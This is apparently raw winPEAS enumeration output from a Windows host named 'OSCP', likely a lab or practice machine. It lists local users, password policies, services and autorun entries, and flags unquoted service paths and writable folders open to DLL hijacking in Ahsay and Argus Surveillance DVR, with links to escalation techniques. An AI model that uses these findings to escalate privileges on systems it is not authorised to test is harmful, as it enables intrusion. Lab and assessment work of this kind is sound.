ÉÍÍÍÍÍÍÍÍÍÍ¹ Logged users
  [X] Exception: Access denied 
    Not Found

ÉÍÍÍÍÍÍÍÍÍÍ¹ Display information about local users
   Computer Name           :   OSCP
   User Name               :   Administrator
   User Id                 :   500
   Is Enabled              :   True
   User Type               :   Administrator
   Comment                 :   Built-in account for administering the computer/domain
   Last Logon              :   2/21/2026 6:03:37 PM
   Logons Count            :   57
   Password Last Set       :   2/21/2022 1:43:13 PM

   =================================================================================================

   Computer Name           :   OSCP
   User Name               :   DefaultAccount
   User Id                 :   503
   Is Enabled              :   False
   User Type               :   Guest
   Comment                 :   A user account managed by the system.
   Last Logon              :   1/1/1970 12:00:00 AM
   Logons Count            :   0
   Password Last Set       :   1/1/1970 12:00:00 AM

   =================================================================================================

   Computer Name           :   OSCP
   User Name               :   Guest
   User Id                 :   501
   Is Enabled              :   False
   User Type               :   Guest
   Comment                 :   Built-in account for guest access to the computer/domain
   Last Logon              :   1/1/1970 12:00:00 AM
   Logons Count            :   0
   Password Last Set       :   1/1/1970 12:00:00 AM

   =================================================================================================

   Computer Name           :   OSCP
   User Name               :   Sandra
   User Id                 :   1002
   Is Enabled              :   True
   User Type               :   User
   Comment                 :   
   Last Logon              :   2/21/2026 9:38:48 PM
   Logons Count            :   28
   Password Last Set       :   3/15/2023 2:16:18 AM

   =================================================================================================

   Computer Name           :   OSCP
   User Name               :   WDAGUtilityAccount
   User Id                 :   504
   Is Enabled              :   False
   User Type               :   Guest
   Comment                 :   A user account managed and used by the system for Windows Defender Application Guard scenarios.
   Last Logon              :   1/1/1970 12:00:00 AM
   Logons Count            :   0
   Password Last Set       :   11/18/2020 11:43:26 PM

   =================================================================================================


ÉÍÍÍÍÍÍÍÍÍÍ¹ RDP Sessions
    Not Found

ÉÍÍÍÍÍÍÍÍÍÍ¹ Ever logged users
  [X] Exception: Access denied 
    Not Found

ÉÍÍÍÍÍÍÍÍÍÍ¹ Home folders found
    C:\Users\Administrator
    C:\Users\All Users
    C:\Users\Default
    C:\Users\Default User
    C:\Users\DefaultAppPool
    C:\Users\Public
    C:\Users\Sandra : Sandra [Allow: AllAccess]

ÉÍÍÍÍÍÍÍÍÍÍ¹ Looking for AutoLogon credentials
    Not Found

ÉÍÍÍÍÍÍÍÍÍÍ¹ Password Policies
È Check for a possible brute-force 
    Domain: Builtin
    SID: S-1-5-32
    MaxPasswordAge: 42.22:47:31.7437440
    MinPasswordAge: 00:00:00
    MinPasswordLength: 0
    PasswordHistoryLength: 0
    PasswordProperties: 0
   =================================================================================================

    Domain: OSCP
    SID: S-1-5-21-4214290425-2411352775-3126579912
    MaxPasswordAge: 42.00:00:00
    MinPasswordAge: 00:00:00
    MinPasswordLength: 0
    PasswordHistoryLength: 0
    PasswordProperties: 0
   =================================================================================================


ÉÍÍÍÍÍÍÍÍÍÍ¹ Print Logon Sessions


ÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍ¹ Processes Information ÌÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍ

ÉÍÍÍÍÍÍÍÍÍÍ¹ Interesting Processes -non Microsoft-
È Check if any interesting processes for memory dump or if you could overwrite some binary running https://book.hacktricks.wiki/en/windows-hardening/windows-local-privilege-escalation/index.html#running-processes
  [X] Exception: Access denied 

ÉÍÍÍÍÍÍÍÍÍÍ¹ Vulnerable Leaked Handlers
È  https://book.hacktricks.wiki/en/windows-hardening/windows-local-privilege-escalation/index.html#leaked-handlers
È Getting Leaked Handlers, it might take some time...
[######----]  62% |###-]  94% /                       Not Found


ÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍ¹ Services Information ÌÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍ
  [X] Exception: Cannot open Service Control Manager on computer '.'. This operation might require other privileges.

ÉÍÍÍÍÍÍÍÍÍÍ¹ Interesting Services -non Microsoft-
È Check if you can overwrite some service binary or perform a DLL hijacking, also check for unquoted paths https://book.hacktricks.wiki/en/windows-hardening/windows-local-privilege-escalation/index.html#services
  [X] Exception: Access denied 
    Ahsay Cloud Backup Suite(Ahsay Cloud Backup Suite)[C:\Program Files\AhsayCBS\bin\cbssvcX64.exe] - Autoload - No quotes and Space detected
    File Permissions: Users [Allow: AllAccess]
    Possible DLL Hijacking in binary folder: C:\Program Files\AhsayCBS\bin (Users [Allow: AllAccess])
   =================================================================================================

    @amdgpio2.inf,%GPIO.SvcDesc%;AMD GPIO Client Driver(Advanced Micro Devices, Inc - @amdgpio2.inf,%GPIO.SvcDesc%;AMD GPIO Client Driver)[C:\Windows\System32\drivers\amdgpio2.sys] - System
   =================================================================================================

    @amdi2c.inf,%amdi2c.SVCDESC%;AMD I2C Controller Service(Advanced Micro Devices, Inc - @amdi2c.inf,%amdi2c.SVCDESC%;AMD I2C Controller Service)[C:\Windows\System32\drivers\amdi2c.sys] - System
   =================================================================================================

    @arcsas.inf,%arcsas_ServiceName%;Adaptec SAS/SATA-II RAID Storport's Miniport Driver(PMC-Sierra, Inc. - @arcsas.inf,%arcsas_ServiceName%;Adaptec SAS/SATA-II RAID Storport's Miniport Driver)[System32\drivers\arcsas.sys] - Boot
   =================================================================================================

    Argus Surveillance DVR Watchdog(PY Software - Argus Surveillance DVR Watchdog)[C:\Program Files\Argus Surveillance DVR\DVRWatchdog.exe] - Autoload - No quotes and Space detected
    File Permissions: Users [Allow: AllAccess]
    Possible DLL Hijacking in binary folder: C:\Program Files\Argus Surveillance DVR (Users [Allow: AllAccess])
    This program monitors and automatically reboots Argus Surveillance DVR if it's locked-up.
   =================================================================================================

    @netbvbda.inf,%vbd_srv_desc%;QLogic Network Adapter VBD(QLogic Corporation - @netbvbda.inf,%vbd_srv_desc%;QLogic Network Adapter VBD)[System32\drivers\bxvbda.sys] - Boot
   =================================================================================================

    @bcmfn2.inf,%bcmfn2.SVCDESC%;bcmfn2 Service(Windows (R) Win 7 DDK provider - @bcmfn2.inf,%bcmfn2.SVCDESC%;bcmfn2 Service)[C:\Windows\System32\drivers\bcmfn2.sys] - System
   =================================================================================================

    @cht4vx64.inf,%cht4vbd.generic%;Chelsio Virtual Bus Driver(Chelsio Communications - @cht4vx64.inf,%cht4vbd.generic%;Chelsio Virtual Bus Driver)[C:\Windows\System32\drivers\cht4vx64.sys] - System
   =================================================================================================

    @netevbda.inf,%vbd_srv_desc%;QLogic 10 Gigabit Ethernet Adapter VBD(QLogic Corporation - @netevbda.inf,%vbd_srv_desc%;QLogic 10 Gigabit Ethernet Adapter VBD)[System32\drivers\evbda.sys] - Boot
   =================================================================================================

    @iagpio.inf,%iagpio.SVCDESC%;Intel Serial IO GPIO Controller Driver(Intel(R) Corporation - @iagpio.inf,%iagpio.SVCDESC%;Intel Serial IO GPIO Controller Driver)[C:\Windows\System32\drivers\iagpio.sys] - System
   =================================================================================================

    @iai2c.inf,%iai2c.SVCDESC%;Intel(R) Serial IO I2C Host Controller(Intel(R) Corporation - @iai2c.inf,%iai2c.SVCDESC%;Intel(R) Serial IO I2C Host Controller)[C:\Windows\System32\drivers\iai2c.sys] - System
   =================================================================================================

    @iaLPSS2i_GPIO2_SKL.inf,%iaLPSS2i_GPIO2.SVCDESC%;Intel(R) Serial IO GPIO Driver v2(Intel Corporation - @iaLPSS2i_GPIO2_SKL.inf,%iaLPSS2i_GPIO2.SVCDESC%;Intel(R) Serial IO GPIO Driver v2)[C:\Windows\System32\drivers\iaLPSS2i_GPIO2.sys] - System
   =================================================================================================

    @iaLPSS2i_GPIO2_BXT_P.inf,%iaLPSS2i_GPIO2_BXT_P.SVCDESC%;Intel(R) Serial IO GPIO Driver v2(Intel Corporation - @iaLPSS2i_GPIO2_BXT_P.inf,%iaLPSS2i_GPIO2_BXT_P.SVCDESC%;Intel(R) Serial IO GPIO Driver v2)[C:\Windows\System32\drivers\iaLPSS2i_GPIO2_BXT_P.sys] - System
   =================================================================================================

    @iaLPSS2i_GPIO2_CNL.inf,%iaLPSS2i_GPIO2_CNL.SVCDESC%;Intel(R) Serial IO GPIO Driver v2(Intel Corporation - @iaLPSS2i_GPIO2_CNL.inf,%iaLPSS2i_GPIO2_CNL.SVCDESC%;Intel(R) Serial IO GPIO Driver v2)[C:\Windows\System32\drivers\iaLPSS2i_GPIO2_CNL.sys] - System
   =================================================================================================

    @iaLPSS2i_GPIO2_GLK.inf,%iaLPSS2i_GPIO2_GLK.SVCDESC%;Intel(R) Serial IO GPIO Driver v2(Intel Corporation - @iaLPSS2i_GPIO2_GLK.inf,%iaLPSS2i_GPIO2_GLK.SVCDESC%;Intel(R) Serial IO GPIO Driver v2)[C:\Windows\System32\drivers\iaLPSS2i_GPIO2_GLK.sys] - System
   =================================================================================================

    @iaLPSS2i_I2C_SKL.inf,%iaLPSS2i_I2C.SVCDESC%;Intel(R) Serial IO I2C Driver v2(Intel Corporation - @iaLPSS2i_I2C_SKL.inf,%iaLPSS2i_I2C.SVCDESC%;Intel(R) Serial IO I2C Driver v2)[C:\Windows\System32\drivers\iaLPSS2i_I2C.sys] - System
   =================================================================================================

    @iaLPSS2i_I2C_BXT_P.inf,%iaLPSS2i_I2C_BXT_P.SVCDESC%;Intel(R) Serial IO I2C Driver v2(Intel Corporation - @iaLPSS2i_I2C_BXT_P.inf,%iaLPSS2i_I2C_BXT_P.SVCDESC%;Intel(R) Serial IO I2C Driver v2)[C:\Windows\System32\drivers\iaLPSS2i_I2C_BXT_P.sys] - System
   =================================================================================================

    @iaLPSS2i_I2C_CNL.inf,%iaLPSS2i_I2C_CNL.SVCDESC%;Intel(R) Serial IO I2C Driver v2(Intel Corporation - @iaLPSS2i_I2C_CNL.inf,%iaLPSS2i_I2C_CNL.SVCDESC%;Intel(R) Serial IO I2C Driver v2)[C:\Windows\System32\drivers\iaLPSS2i_I2C_CNL.sys] - System
   =================================================================================================

    @iaLPSS2i_I2C_GLK.inf,%iaLPSS2i_I2C_GLK.SVCDESC%;Intel(R) Serial IO I2C Driver v2(Intel Corporation - @iaLPSS2i_I2C_GLK.inf,%iaLPSS2i_I2C_GLK.SVCDESC%;Intel(R) Serial IO I2C Driver v2)[C:\Windows\System32\drivers\iaLPSS2i_I2C_GLK.sys] - System
   =================================================================================================

    @ialpssi_gpio.inf,%iaLPSSi_GPIO.SVCDESC%;Intel(R) Serial IO GPIO Controller Driver(Intel Corporation - @ialpssi_gpio.inf,%iaLPSSi_GPIO.SVCDESC%;Intel(R) Serial IO GPIO Controller Driver)[C:\Windows\System32\drivers\iaLPSSi_GPIO.sys] - System
   =================================================================================================

    @ialpssi_i2c.inf,%iaLPSSi_I2C.SVCDESC%;Intel(R) Serial IO I2C Controller Driver(Intel Corporation - @ialpssi_i2c.inf,%iaLPSSi_I2C.SVCDESC%;Intel(R) Serial IO I2C Controller Driver)[C:\Windows\System32\drivers\iaLPSSi_I2C.sys] - System
   =================================================================================================

    @iastorav.inf,%iaStorAVC.DeviceDesc%;Intel Chipset SATA RAID Controller(Intel Corporation - @iastorav.inf,%iaStorAVC.DeviceDesc%;Intel Chipset SATA RAID Controller)[System32\drivers\iaStorAVC.sys] - Boot
   =================================================================================================

    @iastorv.inf,%*PNP0600.DeviceDesc%;Intel RAID Controller Windows 7(Intel Corporation - @iastorv.inf,%*PNP0600.DeviceDesc%;Intel RAID Controller Windows 7)[System32\drivers\iaStorV.sys] - Boot
   =================================================================================================

    @mlx4_bus.inf,%Ibbus.ServiceDesc%;Mellanox InfiniBand Bus/AL (Filter Driver)(Mellanox - @mlx4_bus.inf,%Ibbus.ServiceDesc%;Mellanox InfiniBand Bus/AL (Filter Driver))[C:\Windows\System32\drivers\ibbus.sys] - System
   =================================================================================================

    @mlx4_bus.inf,%MLX4BUS.ServiceDesc%;Mellanox ConnectX Bus Enumerator(Mellanox - @mlx4_bus.inf,%MLX4BUS.ServiceDesc%;Mellanox ConnectX Bus Enumerator)[C:\Windows\System32\drivers\mlx4_bus.sys] - System
   =================================================================================================

    @mlx4_bus.inf,%ndfltr.ServiceDesc%;NetworkDirect Service(Mellanox - @mlx4_bus.inf,%ndfltr.ServiceDesc%;NetworkDirect Service)[C:\Windows\System32\drivers\ndfltr.sys] - System
   =================================================================================================

    NFS Service (Ahsay Systems Corporation)(NFS Service (Ahsay Systems Corporation))[C:\Program Files\AhsayCBS NFS\bin\nfsX64.exe] - Autoload - No quotes and Space detected
    RunDirect Network File System Service of Ahsay Systems Corporation
   =================================================================================================

    @oem10.inf,%pvscsi.DiskName%;pvscsi Storage Controller Driver(VMware, Inc. - @oem10.inf,%pvscsi.DiskName%;pvscsi Storage Controller Driver)[System32\drivers\pvscsi.sys] - Boot
   =================================================================================================

    OpenSSH Authentication Agent(OpenSSH Authentication Agent)[C:\Windows\System32\OpenSSH\ssh-agent.exe] - Manual
    Agent to hold private keys used for public key authentication.
   =================================================================================================

    @usbstor.inf,%USBSTOR.SvcDesc%;USB Mass Storage Driver(@usbstor.inf,%USBSTOR.SvcDesc%;USB Mass Storage Driver)[C:\Windows\System32\drivers\USBSTOR.SYS] - Manual
   =================================================================================================

    @usbxhci.inf,%PCI\CC_0C0330.DeviceDesc%;USB xHCI Compliant Host Controller(@usbxhci.inf,%PCI\CC_0C0330.DeviceDesc%;USB xHCI Compliant Host Controller)[C:\Windows\System32\drivers\USBXHCI.SYS] - System
   =================================================================================================

    VMware Alias Manager and Ticket Service(VMware, Inc. - VMware Alias Manager and Ticket Service)["C:\Program Files\VMware\VMware Tools\VMware VGAuth\VGAuthService.exe"] - Autoload
    Alias Manager and Ticket Service
   =================================================================================================

    @oem8.inf,%VM3DSERVICE_DISPLAYNAME%;VMware SVGA Helper Service(VMware, Inc. - @oem8.inf,%VM3DSERVICE_DISPLAYNAME%;VMware SVGA Helper Service)[C:\Windows\system32\vm3dservice.exe] - Autoload
    @oem8.inf,%VM3DSERVICE_DESCRIPTION%;Helps VMware SVGA driver by collecting and conveying user mode information
   =================================================================================================

    @oem2.inf,%loc.vmciServiceDisplayName%;VMware VMCI Bus Driver(VMware, Inc. - @oem2.inf,%loc.vmciServiceDisplayName%;VMware VMCI Bus Driver)[System32\drivers\vmci.sys] - Boot
   =================================================================================================

    VMware Host Guest Client Redirector(VMware, Inc. - VMware Host Guest Client Redirector)[system32\DRIVERS\vmhgfs.sys] - System
    Implements the VMware HGFS protocol. This protocol provides connectivity to host files provided by the HGFS server.
   =================================================================================================

    Memory Control Driver(VMware, Inc. - Memory Control Driver)[C:\Windows\system32\DRIVERS\vmmemctl.sys] - Autoload
    Driver to provide enhanced memory management of this virtual machine.
   =================================================================================================

    @oem7.inf,%VMMouse.SvcDesc%;VMware Pointing Device(VMware, Inc. - @oem7.inf,%VMMouse.SvcDesc%;VMware Pointing Device)[C:\Windows\System32\drivers\vmmouse.sys] - System
   =================================================================================================

    VMware Physical Disk Helper(VMware, Inc. - VMware Physical Disk Helper)[C:\Windows\system32\DRIVERS\vmrawdsk.sys] - System
    VMware Physical Disk Helper
   =================================================================================================

    VMware Tools(VMware, Inc. - VMware Tools)["C:\Program Files\VMware\VMware Tools\vmtoolsd.exe"] - Autoload
    Provides support for synchronizing objects between the host and guest operating systems.
   =================================================================================================

    @oem9.inf,%loc.vmxnet3.ndis6.DispName%;vmxnet3 NDIS 6 Ethernet Adapter Driver(VMware, Inc. - @oem9.inf,%loc.vmxnet3.ndis6.DispName%;vmxnet3 NDIS 6 Ethernet Adapter Driver)[C:\Windows\System32\drivers\vmxnet3.sys] - System
   =================================================================================================

    vnetWFP(VMware, Inc. - vnetWFP)[C:\Windows\system32\DRIVERS\vnetWFP.sys] - System
    Guest Introspection Network Filter Driver
   =================================================================================================

    vsepflt(VMware, Inc. - vsepflt)[system32\DRIVERS\vsepflt.sys] - Boot
    Guest Introspection Driver
   =================================================================================================

    vSockets Virtual Machine Communication Interface Sockets driver(VMware, Inc. - vSockets Virtual Machine Communication Interface Sockets driver)[system32\DRIVERS\vsock.sys] - Boot
    vSockets Driver
   =================================================================================================

    @vstxraid.inf,%Driver.DeviceDesc%;VIA StorX Storage RAID Controller Windows Driver(VIA Corporation - @vstxraid.inf,%Driver.DeviceDesc%;VIA StorX Storage RAID Controller Windows Driver)[System32\drivers\vstxraid.sys] - Boot
   =================================================================================================

    @mlx4_bus.inf,%WinMad.ServiceDesc%;WinMad Service(Mellanox - @mlx4_bus.inf,%WinMad.ServiceDesc%;WinMad Service)[C:\Windows\System32\drivers\winmad.sys] - System
   =================================================================================================

    @winusb.inf,%WINUSB_SvcName%;WinUsb Driver(@winusb.inf,%WINUSB_SvcName%;WinUsb Driver)[C:\Windows\System32\drivers\WinUSB.SYS] - System
    @winusb.inf,%WINUSB_SvcDesc%;Generic driver for USB devices
   =================================================================================================

    @mlx4_bus.inf,%WinVerbs.ServiceDesc%;WinVerbs Service(Mellanox - @mlx4_bus.inf,%WinVerbs.ServiceDesc%;WinVerbs Service)[C:\Windows\System32\drivers\winverbs.sys] - System
   =================================================================================================


ÉÍÍÍÍÍÍÍÍÍÍ¹ Modifiable Services
È Check if you can modify any service https://book.hacktricks.wiki/en/windows-hardening/windows-local-privilege-escalation/index.html#services
    You cannot modify any service

ÉÍÍÍÍÍÍÍÍÍÍ¹ Looking if you can modify any service registry
È Check if you can modify the registry of a service https://book.hacktricks.wiki/en/windows-hardening/windows-local-privilege-escalation/index.html#services-registry-modify-permissions
    [-] Looks like you cannot change the registry of any service...

ÉÍÍÍÍÍÍÍÍÍÍ¹ Checking write permissions in PATH folders (DLL Hijacking)
È Check for DLL Hijacking in PATH folders https://book.hacktricks.wiki/en/windows-hardening/windows-local-privilege-escalation/index.html#dll-hijacking
    C:\Windows\system32
    C:\Windows
    C:\Windows\System32\Wbem
    C:\Windows\System32\WindowsPowerShell\v1.0\
    C:\Windows\System32\OpenSSH\


ÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍ¹ Applications Information ÌÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍ

ÉÍÍÍÍÍÍÍÍÍÍ¹ Current Active Window Application
  [X] Exception: Object reference not set to an instance of an object.

ÉÍÍÍÍÍÍÍÍÍÍ¹ Installed Applications --Via Program Files/Uninstall registry--
È Check if you can modify installed software https://book.hacktricks.wiki/en/windows-hardening/windows-local-privilege-escalation/index.html#applications
    C:\Program Files\AhsayCBS(Users [Allow: AllAccess])
    C:\Program Files\AhsayCBS NFS
    C:\Program Files\Argus Surveillance DVR(Users [Allow: AllAccess])
    C:\Program Files\Common Files
    C:\Program Files\desktop.ini
    C:\Program Files\Internet Explorer
    C:\Program Files\Microsoft
    C:\Program Files\Microsoft Update Health Tools
    C:\Program Files\ModifiableWindowsApps
    C:\Program Files\PCHealthCheck
    C:\Program Files\RUXIM
    C:\Program Files\Uninstall Information
    C:\Program Files\VMware
    C:\Program Files\Windows Defender
    C:\Program Files\Windows Defender Advanced Threat Protection
    C:\Program Files\Windows Mail
    C:\Program Files\Windows Media Player
    C:\Program Files\Windows Multimedia Platform
    C:\Program Files\Windows NT
    C:\Program Files\Windows Photo Viewer
    C:\Program Files\Windows Portable Devices
    C:\Program Files\Windows Security
    C:\Program Files\Windows Sidebar
    C:\Program Files\WindowsApps
    C:\Program Files\WindowsPowerShell


ÉÍÍÍÍÍÍÍÍÍÍ¹ Autorun Applications
È Check if you can modify other users AutoRuns binaries (Note that is normal that you can modify HKCU registry and binaries indicated there) https://book.hacktricks.wiki/en/windows-hardening/windows-local-privilege-escalation/privilege-escalation-with-autorun-binaries.html
Error getting autoruns from WMIC: System.Management.ManagementException: Access denied 
   at System.Management.ThreadDispatch.Start()
   at System.Management.ManagementScope.Initialize()
   at System.Management.ManagementObjectSearcher.Initialize()
   at System.Management.ManagementObjectSearcher.Get()
   at winPEAS.Info.ApplicationInfo.AutoRuns.GetAutoRunsWMIC()

    RegPath: HKLM\Software\Microsoft\Windows\CurrentVersion\Run
    Key: SecurityHealth
    Folder: C:\Windows\system32
    File: C:\Windows\system32\SecurityHealthSystray.exe
   =================================================================================================


    RegPath: HKLM\Software\Microsoft\Windows\CurrentVersion\Run
    Key: VMware User Process
    Folder: C:\Program Files\VMware\VMware Tools
    File: C:\Program Files\VMware\VMware Tools\vmtoolsd.exe -n vmusr (Unquoted and Space detected) - C:\
   =================================================================================================


    RegPath: HKCU\Software\Microsoft\Windows\CurrentVersion\Run
    RegPerms: Sandra [Allow: FullControl]
    Key: OneDriveSetup
    Folder: C:\Windows\SysWOW64
    File: C:\Windows\SysWOW64\OneDriveSetup.exe /thfirstsetup
   =================================================================================================


    RegPath: HKLM\Software\Microsoft\Windows\CurrentVersion\Explorer\Shell Folders
    Key: Common Startup
    Folder: C:\ProgramData\Microsoft\Windows\Start Menu\Programs\Startup
   =================================================================================================


    RegPath: HKLM\Software\Microsoft\Windows\CurrentVersion\Explorer\User Shell Folders
    Key: Common Startup
    Folder: C:\ProgramData\Microsoft\Windows\Start Menu\Programs\Startup
   =================================================================================================


    RegPath: HKLM\Software\Microsoft\Windows NT\CurrentVersion\Winlogon
    Key: Userinit
    Folder: C:\Windows\system32
    File: C:\Windows\system32\userinit.exe,
   =================================================================================================


    RegPath: HKLM\Software\Microsoft\Windows NT\CurrentVersion\Winlogon
    Key: Shell
    Folder: None (PATH Injection)
    File: explorer.exe
   =================================================================================================


    RegPath: HKLM\SYSTEM\CurrentControlSet\Control\SafeBoot
    Key: AlternateShell
    Folder: None (PATH Injection)
    File: cmd.exe
   =================================================================================================


    RegPath: HKLM\Software\Microsoft\Windows NT\CurrentVersion\Font Drivers
    Key: Adobe Type Manager
    Folder: None (PATH Injection)
    File: atmfd.dll
   =================================================================================================


    RegPath: HKLM\Software\WOW6432Node\Microsoft\Windows NT\CurrentVersion\Font Drivers
    Key: Adobe Type Manager
    Folder: None (PATH Injection)
    File: atmfd.dll
   =================================================================================================


    RegPath: HKLM\Software\Microsoft\Windows NT\CurrentVersion\Drivers32
    Key: aux
    Folder: None (PATH Injection)
    File: wdmaud.drv
   =================================================================================================


    RegPath: HKLM\Software\Microsoft\Windows NT\CurrentVersion\Drivers32
    Key: midi
    Folder: None (PATH Injection)
    File: wdmaud.drv
   =================================================================================================


    RegPath: HKLM\Software\Microsoft\Windows NT\CurrentVersion\Drivers32
    Key: midimapper
    Folder: None (PATH Injection)
    File: midimap.dll
   =================================================================================================


    RegPath: HKLM\Software\Microsoft\Windows NT\CurrentVersion\Drivers32
    Key: mixer
    Folder: None (PATH Injection)
    File: wdmaud.drv
   =================================================================================================


    RegPath: HKLM\Software\Microsoft\Windows NT\CurrentVersion\Drivers32
    Key: msacm.imaadpcm
    Folder: None (PATH Injection)
    File: imaadp32.acm
   =================================================================================================


    RegPath: HKLM\Software\Microsoft\Windows NT\CurrentVersion\Drivers32
    Key: msacm.msadpcm
    Folder: None (PATH Injection)
    File: msadp32.acm
   =================================================================================================


    RegPath: HKLM\Software\Microsoft\Windows NT\CurrentVersion\Drivers32
    Key: msacm.msg711
    Folder: None (PATH Injection)
    File: msg711.acm
   =================================================================================================


    RegPath: HKLM\Software\Microsoft\Windows NT\CurrentVersion\Drivers32
    Key: msacm.msgsm610
    Folder: None (PATH Injection)
    File: msgsm32.acm
   =================================================================================================


    RegPath: HKLM\Software\Microsoft\Windows NT\CurrentVersion\Drivers32
    Key: vidc.i420
    Folder: None (PATH Injection)
    File: iyuv_32.dll
   =================================================================================================


    RegPath: HKLM\Software\Microsoft\Windows NT\CurrentVersion\Drivers32
    Key: vidc.iyuv
    Folder: None (PATH Injection)
    File: iyuv_32.dll
   =================================================================================================


    RegPath: HKLM\Software\Microsoft\Windows NT\CurrentVersion\Drivers32
    Key: vidc.mrle
    Folder: None (PATH Injection)
    File: msrle32.dll
   =================================================================================================


    RegPath: HKLM\Software\Microsoft\Windows NT\CurrentVersion\Drivers32
    Key: vidc.msvc
    Folder: None (PATH Injection)
    File: msvidc32.dll
   =================================================================================================


    RegPath: HKLM\Software\Microsoft\Windows NT\CurrentVersion\Drivers32
    Key: vidc.uyvy
    Folder: None (PATH Injection)
    File: msyuv.dll
   =================================================================================================


    RegPath: HKLM\Software\Microsoft\Windows NT\CurrentVersion\Drivers32
    Key: vidc.yuy2
    Folder: None (PATH Injection)
    File: msyuv.dll
   =================================================================================================


    RegPath: HKLM\Software\Microsoft\Windows NT\CurrentVersion\Drivers32
    Key: vidc.yvu9
    Folder: None (PATH Injection)
    File: tsbyuv.dll
   =================================================================================================


    RegPath: HKLM\Software\Microsoft\Windows NT\CurrentVersion\Drivers32
    Key: vidc.yvyu
    Folder: None (PATH Injection)
    File: msyuv.dll
   =================================================================================================


    RegPath: HKLM\Software\Microsoft\Windows NT\CurrentVersion\Drivers32
    Key: wave
    Folder: None (PATH Injection)
    File: wdmaud.drv
   =================================================================================================


    RegPath: HKLM\Software\Microsoft\Windows NT\CurrentVersion\Drivers32
    Key: wavemapper
    Folder: None (PATH Injection)
    File: msacm32.drv
   =================================================================================================


    RegPath: HKLM\Software\Microsoft\Windows NT\CurrentVersion\Drivers32
    Key: msacm.l3acm
    Folder: C:\Windows\System32
    File: C:\Windows\System32\l3codeca.acm
   =================================================================================================


    RegPath: HKLM\Software\Wow6432Node\Microsoft\Windows NT\CurrentVersion\Drivers32
    Key: aux
    Folder: None (PATH Injection)
    File: wdmaud.drv
   =================================================================================================


    RegPath: HKLM\Software\Wow6432Node\Microsoft\Windows NT\CurrentVersion\Drivers32
    Key: midi
    Folder: None (PATH Injection)
    File: wdmaud.drv
   =================================================================================================


    RegPath: HKLM\Software\Wow6432Node\Microsoft\Windows NT\CurrentVersion\Drivers32
    Key: midimapper
    Folder: None (PATH Injection)
    File: midimap.dll
   =================================================================================================


    RegPath: HKLM\Software\Wow6432Node\Microsoft\Windows NT\CurrentVersion\Drivers32
    Key: mixer
    Folder: None (PATH Injection)
    File: wdmaud.drv
   =================================================================================================


    RegPath: HKLM\Software\Wow6432Node\Microsoft\Windows NT\CurrentVersion\Drivers32
    Key: msacm.imaadpcm
    Folder: None (PATH Injection)
    File: imaadp32.acm
   =================================================================================================


    RegPath: HKLM\Software\Wow6432Node\Microsoft\Windows NT\CurrentVersion\Drivers32
    Key: msacm.msadpcm
    Folder: None (PATH Injection)
    File: msadp32.acm
   =================================================================================================


    RegPath: HKLM\Software\Wow6432Node\Microsoft\Windows NT\CurrentVersion\Drivers32
    Key: msacm.msg711
    Folder: None (PATH Injection)
    File: msg711.acm
   =================================================================================================


    RegPath: HKLM\Software\Wow6432Node\Microsoft\Windows NT\CurrentVersion\Drivers32
    Key: msacm.msgsm610
    Folder: None (PATH Injection)
    File: msgsm32.acm
   =================================================================================================


    RegPath: HKLM\Software\Wow6432Node\Microsoft\Windows NT\CurrentVersion\Drivers32
    Key: vidc.cvid
    Folder: None (PATH Injection)
    File: iccvid.dll
   =================================================================================================


    RegPath: HKLM\Software\Wow6432Node\Microsoft\Windows NT\CurrentVersion\Drivers32
    Key: vidc.i420
    Folder: None (PATH Injection)
    File: iyuv_32.dll
   =================================================================================================


    RegPath: HKLM\Software\Wow6432Node\Microsoft\Windows NT\CurrentVersion\Drivers32
    Key: vidc.iyuv
    Folder: None (PATH Injection)
    File: iyuv_32.dll
   =================================================================================================


    RegPath: HKLM\Software\Wow6432Node\Microsoft\Windows NT\CurrentVersion\Drivers32
    Key: vidc.mrle
    Folder: None (PATH Injection)
    File: msrle32.dll
   =================================================================================================


    RegPath: HKLM\Software\Wow6432Node\Microsoft\Windows NT\CurrentVersion\Drivers32
    Key: vidc.msvc
    Folder: None (PATH Injection)
    File: msvidc32.dll
   =================================================================================================


    RegPath: HKLM\Software\Wow6432Node\Microsoft\Windows NT\CurrentVersion\Drivers32
    Key: vidc.uyvy
    Folder: None (PATH Injection)
    File: msyuv.dll
   =================================================================================================


    RegPath: HKLM\Software\Wow6432Node\Microsoft\Windows NT\CurrentVersion\Drivers32
    Key: vidc.yuy2
    Folder: None (PATH Injection)
    File: msyuv.dll
   =================================================================================================


    RegPath: HKLM\Software\Wow6432Node\Microsoft\Windows NT\CurrentVersion\Drivers32
    Key: vidc.yvu9
    Folder: None (PATH Injection)
    File: tsbyuv.dll
   =================================================================================================


    RegPath: HKLM\Software\Wow6432Node\Microsoft\Windows NT\CurrentVersion\Drivers32
    Key: vidc.yvyu
    Folder: None (PATH Injection)
    File: msyuv.dll
   =================================================================================================


    RegPath: HKLM\Software\Wow6432Node\Microsoft\Windows NT\CurrentVersion\Drivers32
    Key: wave
    Folder: None (PATH Injection)
    File: wdmaud.drv
   =================================================================================================


    RegPath: HKLM\Software\Wow6432Node\Microsoft\Windows NT\CurrentVersion\Drivers32
    Key: wavemapper
    Folder: None (PATH Injection)
    File: msacm32.drv
   =================================================================================================


    RegPath: HKLM\Software\Wow6432Node\Microsoft\Windows NT\CurrentVersion\Drivers32
    Key: msacm.l3acm
    Folder: C:\Windows\SysWOW64
    File: C:\Windows\SysWOW64\l3codeca.acm
   =================================================================================================


    RegPath: HKLM\System\CurrentControlSet\Control\Session Manager\KnownDlls
    Key: _wow64cpu
    Folder: None (PATH Injection)
    File: wow64cpu.dll
   =================================================================================================


    RegPath: HKLM\System\CurrentControlSet\Control\Session Manager\KnownDlls
    Key: _wowarmhw
    Folder: None (PATH Injection)
    File: wowarmhw.dll
   =================================================================================================


